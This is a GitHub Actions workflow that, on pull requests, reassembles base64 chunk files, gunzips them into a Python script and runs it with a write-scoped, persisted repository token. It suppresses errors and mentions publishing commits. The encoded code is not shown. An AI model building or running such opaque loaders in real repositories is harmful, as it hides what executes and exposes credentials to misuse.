name: Build job recovery milestones

on:
  pull_request:
    branches: [main]

permissions:
  contents: write

env:
  CARGO_TERM_COLOR: never
  CARGO_TERM_QUIET: "true"

concurrency:
  group: chronosphere-job-recovery-bootstrap
  cancel-in-progress: true

jobs:
  implement:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: chore/job-recovery-bootstrap
          fetch-depth: 0
          persist-credentials: true
      - uses: dtolnay/rust-toolchain@stable
        with:
          toolchain: "1.88"
          components: rustfmt, clippy
      - name: Build and validate milestones
        id: implementation
        shell: bash
        run: |
          set +e
          {
            cat .github/job-recovery-chunks/{00..08} > /tmp/job-recovery.b64
            echo "143e3cdea9547b4e4aee850855be7544bf391854b3e93d8e0e034a935a3fe81c  /tmp/job-recovery.b64" | sha256sum -c -
            base64 -d /tmp/job-recovery.b64 | gzip -d > /tmp/job_recovery_impl.py
            echo "7e688c015204fcb6ef8aaf953787fa8499762884cb48b05635a20374bea7ac4a  /tmp/job_recovery_impl.py" | sha256sum -c -
            python3 .github/patch_job_recovery_runner.py
            python3 -m py_compile /tmp/job_recovery_impl.py
            python3 /tmp/job_recovery_impl.py
          } > /tmp/job-recovery.log 2>&1
          status=$?
          set -e
          echo "status=${status}" >> "$GITHUB_OUTPUT"
          tail -n 200 /tmp/job-recovery.log
          exit 0
      - name: Upload implementation log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: job-recovery-implementation-log-${{ github.run_id }}
          path: /tmp/job-recovery.log
          if-no-files-found: error
          retention-days: 7
      - name: Enforce implementation result
        if: steps.implementation.outputs.status != '0'
        run: exit 1

# Resume validated milestones and publish each commit immediately.
